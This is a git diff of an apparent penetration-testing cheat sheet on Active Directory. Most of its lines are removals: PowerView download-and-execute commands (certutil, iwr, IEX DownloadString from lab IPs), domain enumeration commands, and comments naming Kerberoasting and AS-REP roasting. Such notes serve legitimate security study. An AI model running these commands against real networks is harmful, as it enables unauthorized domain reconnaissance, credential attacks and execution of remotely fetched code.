@@ -691,69 +691,19 @@ git diff <commit hash>
 
 # Active Directory
 
-[Domain Enumeration + Exploitation | burmat / nathan burchfield](https://burmat.gitbook.io/security/hacking/domain-exploitation)
+
+
 
 ```jsx
-net users
-net users /domain
-net groups /domain
-net localgroup administrators
-```
 
-## PowerView
-
-```jsx
-certutil -urlcache -split -f http://192.168.45.226/PowerView.ps1
-iwr -uri http://10.10.170.141:8080/PowerView.ps1 -UseBasicParsing -OutFile C:\Users\celia.almeda\Documents\PowerView.ps1
-Import-Module .\PowerView.ps1
-
-IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.171/PowerView.ps1')
-```
-
-[PowerView/SharpView | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)
-
-```jsx
-Get-DomainController
-Get-NetComputer | select samaccountname, operatingsystem
-Get-DomainUser | select cn, samaccountname, memberof
-Get-DomainGroupMember -Identity "Domain Admin" -Recurse
-Invoke-UserHunter -CheckAccess
-Get-NetLoggedon -ComputerName <servername>
-Get-NetSession -ComputerName <servername>
-Get-DomainUser -PreauthNotRequired
-Get-DomainUser -SPN | select name
 
 Find-DomainShare -CheckShareAccess
-Find-LocalAdminAccess
-Invoke-UserHunter -GroupName "RDPUsers"
-Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
 
-Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
 Find-InterestingDomainAcl -ResolveGUIDs
 Get-GPO -Guid 31B2F340-016D-11D2-945F-00C04FB984F9
 
 ```
 
-```jsx
-# Get Domain Controller
-# Get Computers + OS
-# Get Users + groups
-# Check Domain Admins
-# Check access to PC with Domain Admin session on
-# Check Logged on sessions (Need admin - if successful we are local admin)
-# Check Logged on sessions (No need for admin)
-# AS-REP Roasting
-# Kerberoasting (all services are kerberoasable)
-
-# Check access to SMB shares
-# Find local admin rights
-# 
-# 
- 
-# Find interesting ACLs
-# Find intresting ACEs 
-# Resolve GUID if CN not resolved
-```
 
 ### Kerberoasting
 
